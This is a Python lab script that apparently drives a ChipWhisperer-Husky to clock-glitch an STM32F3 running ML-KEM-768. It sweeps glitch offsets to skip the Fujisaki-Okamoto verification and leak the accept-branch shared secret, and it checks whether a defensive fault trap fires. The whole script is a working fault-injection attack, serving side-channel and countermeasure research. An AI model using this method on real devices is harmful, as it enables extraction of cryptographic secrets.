#!/usr/bin/env python3
"""
FO single-skip leak campaign for ML-KEM-768 on STM32F3 + ChipWhisperer-Husky.

Trigger is raised INSIDE kem.c (fo_trigger_high/low) right at the FO
verify/cmov, so the vulnerable ext_offset is a small window near 0.
A leak is res == K_TARGET (the real accept-branch secret), not merely
res != baseline.
"""

import chipwhisperer as cw
import time
import csv

# ---------------------------------------------------------------------------
# Confirmed ML-KEM-768 FIPS 203 vector (matches random_data.h / kyber-py).
#   Baseline (no glitch) = rejection key J(z||c')  -> EXPECTED_BASELINE
#   A verify/cmov skip leaks the accept-branch secret -> K_TARGET
# ---------------------------------------------------------------------------
K_TARGET          = bytes.fromhex("2eec0d2747a234c7f23dbf4838b6d0400bbba6ca4c82e98fd102aaeecc0f646d")
EXPECTED_BASELINE = bytes.fromhex("4eda6889ca1f5f024fdfac9c60040271bcab7faf8f24dfa19d1995f8e5fe48ab")
TRAP_SIGNATURE    = bytes([0xEE] * 32)     # defended firmware's fault sentinel

# --- scope / target setup --------------------------------------------------
scope = cw.scope()
target = cw.target(scope)

scope.clock.clkgen_freq = 7372800
scope.clock.clkgen_src = "internal"
scope.clock.adc_mul = 4
scope.io.tio1 = "serial_rx"
scope.io.tio2 = "serial_tx"
scope.trigger.triggers = "tio4"
target.baud = 38400

scope.glitch.enabled = True
scope.glitch.clk_src = "pll"
scope.glitch.trigger_src = "ext_single"
scope.io.hs2 = "glitch"
scope.glitch.output = "clock_xor"

TARGET_WIDTH  = 459
TARGET_OFFSET = -691
# Trigger sits AT the FO check, so the window is small and near 0.
START_CYCLE   = 2150
END_CYCLE     = 2250#8000
STEP          = 1        # bump to 2 for a faster first locate pass

def reset_target():
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high_z'
    time.sleep(0.2)
    target.flush()


def decap(ext_offset, repeat):
    scope.glitch.width      = TARGET_WIDTH
    scope.glitch.offset     = TARGET_OFFSET
    scope.glitch.ext_offset = ext_offset
    scope.glitch.repeat     = repeat
    target.flush()
    scope.arm()
    target.simpleserial_write('d', bytearray())
    try:
        return target.simpleserial_read('r', 32, timeout=1000, ack=False)
    except Exception:
        return None

'''def decap(ext_offset, repeat):
    """One armed decapsulation at a given glitch position. Returns bytes|None."""
    scope.glitch.width      = TARGET_WIDTH
    scope.glitch.offset     = TARGET_OFFSET
    scope.glitch.ext_offset = ext_offset
    scope.glitch.repeat     = repeat
    target.flush()
    scope.arm()
    target.simpleserial_write('d', bytearray())
    return target.simpleserial_read('r', 32, timeout=1000)'''

def recover():
    scope.glitch.output = "clock_only"
    reset_target()
    scope.glitch.output = "clock_xor"

def classify(res, baseline_ss):
    if res is None:               return "Crash"
    res = bytes(res)
    if res == TRAP_SIGNATURE:     return "Trapped"      # defense fired
    if res == baseline_ss:        return "Normal"       # rejection held (K_rej)
    if res == K_TARGET:           return "LEAK"         # <-- real secret revealed
    return "Corruption"                                 # effective-but-not-exploitable

# --- baseline (NO glitch): must be the rejection key, NOT K_TARGET ----------
reset_target()
print("[+] Establishing baseline (expect the rejection key)...")
scope.adc.basic_mode = "rising_edge"
target.flush()
target.simpleserial_write('d', bytearray())
baseline_ss = target.simpleserial_read('r', 32, timeout=2000)
if not baseline_ss:
    print("[!] Target unresponsive."); scope.dis(); target.dis(); exit(1)
baseline_ss = bytes(baseline_ss)
print(f"[+] Baseline : {baseline_ss.hex()}")
print(f"[+] K_TARGET : {K_TARGET.hex()}")
print("[+] baseline == expected K_rej:",
      "YES" if baseline_ss == EXPECTED_BASELINE else "NO (wrong firmware/vector flashed?)")
if baseline_ss == K_TARGET:
    print("[!!] baseline == K_TARGET -> firmware is decapsulating a VALID ciphertext.")
    print("     Nothing to leak. Point 'd' at a FIXED INVALID ciphertext first.")
    scope.dis(); target.dis(); exit(1)

# --- phase 1: sweep to find candidate leak offsets --------------------------
counts = {"Normal":0,"Crash":0,"Corruption":0,"LEAK":0,"Trapped":0}
candidates = []
with open('fo_leak_sweep.csv','w',newline='') as f:
    w = csv.writer(f); w.writerow(['ExtOffset','Repeat','Status','SharedSecret'])
    for repeat in (1, 2):
        print(f"\n[+] Sweep width={TARGET_WIDTH} offset={TARGET_OFFSET} repeat={repeat}")
        for ext_offset in range(START_CYCLE, END_CYCLE, STEP):
            res = decap(ext_offset, repeat)
            status = classify(res, baseline_ss)
            counts[status] += 1
            w.writerow([ext_offset, repeat, status, bytes(res).hex() if res else "N/A"])
            if status == "LEAK":
                candidates.append((ext_offset, repeat))
                print(f"  [***] LEAK @ offset={ext_offset} repeat={repeat}")
            if status in ("Crash", "Trapped", "Corruption"):
                recover()
            time.sleep(0.002)

print("\n=== SWEEP SUMMARY ===")
for k, v in counts.items():
    print(f"  {k:11s}: {v}")

# --- phase 2: reliability at the best candidate -----------------------------
def verify_offset(ext_offset, repeat, trials=100):
    hits = 0
    for _ in range(trials):
        reset_target()                       # independent trials
        res = decap(ext_offset, repeat)
        if res is not None and bytes(res) == K_TARGET:
            hits += 1
        recover()
    rate = hits / trials
    print(f"[+] offset={ext_offset} repeat={repeat}: leak rate {hits}/{trials} = {100*rate:.1f}%")
    return rate

if candidates:
    off, rep = candidates[0]
    print(f"\n[+] Measuring reliability at {off}, repeat={rep}...")
    verify_offset(off, rep, trials=100)
else:
    print("\n[!] No offset produced res == K_TARGET. You have corruption, not a clean skip.")

scope.dis(); target.dis()
